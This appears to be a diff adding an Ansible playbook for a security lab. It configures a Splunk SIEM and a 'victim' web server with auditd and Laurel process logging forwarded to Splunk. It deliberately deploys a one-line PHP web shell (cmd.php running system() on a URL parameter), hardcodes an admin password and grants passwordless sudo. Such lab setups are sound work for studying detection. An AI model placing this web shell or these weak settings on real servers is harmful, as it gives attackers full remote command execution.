@@ -1,0 +1,122 @@
+---
+- name: Configure Splunk Enterprise (SIEM)
+  hosts: splunk
+  become: yes
+  tasks:
+    - name: Download Splunk installer directly to the VM
+      get_url:
+        url: "https://download.splunk.com/products/splunk/releases/10.6.1.1/linux/splunk-10.6.1.1-b2ae2962645c-linux-amd64.deb"
+        dest: /tmp/splunk.deb
+
+    - name: Install Splunk Enterprise from the downloaded .deb
+      apt:
+        deb: /tmp/splunk.deb
+    
+    - name: Ensure correct ownership for Splunk directory
+      file:
+        path: /opt/splunk
+        owner: splunk
+        group: splunk
+        recurse: yes
+
+    - name: Create admin credentials so it doesn't hang
+      copy:
+        dest: /opt/splunk/etc/system/local/user-seed.conf
+        content: |
+          [user_info]
+          USERNAME = admin
+          PASSWORD = deia_password_123!
+
+    - name: Start Splunk and accept license
+      command: /opt/splunk/bin/splunk start --accept-license --answer-yes --no-prompt --run-as-root
+      args:
+        creates: /opt/splunk/etc/auth/splunk.secret
+
+    - name: Enable Splunk boot-start for splunk user
+      command: /opt/splunk/bin/splunk enable boot-start -user splunk
+
+    - name: Enable receiver port 9997
+      command: /opt/splunk/bin/splunk enable listen 9997 --run-as-root
+      ignore_errors: yes
+
+    - name: Create linux index
+      command: /opt/splunk/bin/splunk add index linux --run-as-root
+      ignore_errors: yes
+
+- name: Configure Web Server (Victim)
+  hosts: webserver
+  become: yes
+  tasks:
+    - name: Fix local hostname resolution for sudo
+      lineinfile:
+        path: /etc/hosts
+        line: "127.0.1.1 {{ ansible_hostname }}"
+        state: present
+
+    - name: Enable passwordless sudo for webserver_deia
+      copy:
+        dest: /etc/sudoers.d/webserver_deia
+        content: "webserver_deia ALL=(ALL) NOPASSWD: ALL"
+        mode: '0440'
+
+    - name: Install Apache, PHP, and utilities
+      apt:
+        name:
+          - apache2
+          - php
+          - libapache2-mod-php
+          - auditd
+          - laurel
+          - jq
+        state: present
+        update_cache: yes
+
+    - name: Deploy cmd.php web shell
+      copy:
+        dest: /var/www/html/cmd.php
+        content: '<?php system($_GET["c"]); ?>'
+        owner: www-data
+        mode: '0644'
+
+    - name: Configure audit rules to monitor process execution (execve)
+      copy:
+        dest: /etc/audit/rules.d/deia.rules
+        content: |
+          -D
+          -b 8192
+          -f 1
+          -a always,exit -F arch=b64 -S execve -F key=exec
+          -a always,exit -F arch=b32 -S execve -F key=exec
+
+    - name: Apply audit rules and restart auditd
+      shell: augenrules --load && systemctl restart auditd
+
+    - name: Download Splunk Universal Forwarder directly to web server
+      get_url:
+        url: "https://download.splunk.com/products/universalforwarder/releases/10.6.1.1/linux/splunkforwarder-10.6.1.1-b2ae2962645c-linux-amd64.deb"
+        dest: /tmp/splunkforwarder.deb
+
+    - name: Install Splunk Universal Forwarder .deb
+      apt:
+        deb: /tmp/splunkforwarder.deb
+
+    - name: Accept license and start Universal Forwarder
+      command: /opt/splunkforwarder/bin/splunk start --accept-license --answer-yes --no-prompt --run-as-root
+      args:
+        creates: /opt/splunkforwarder/etc/auth/splunk.secret
+
+    - name: Configure forwarder to point to Splunk SIEM (192.168.201.129:9997)
+      command: /opt/splunkforwarder/bin/splunk add forward-server 192.168.201.129:9997 -auth admin:deia_password_123!
+      ignore_errors: yes
+
+    - name: Configure inputs.conf to read Laurel logs
+      copy:
+        dest: /opt/splunkforwarder/etc/system/local/inputs.conf
+        content: |
+          [monitor:///var/log/laurel/audit.log]
+          index = linux
+          sourcetype = laurel
+
+    - name: Restart Splunk Universal Forwarder
+      command: /opt/splunkforwarder/bin/splunk restart --run-as-root
+      ignore_errors: yes
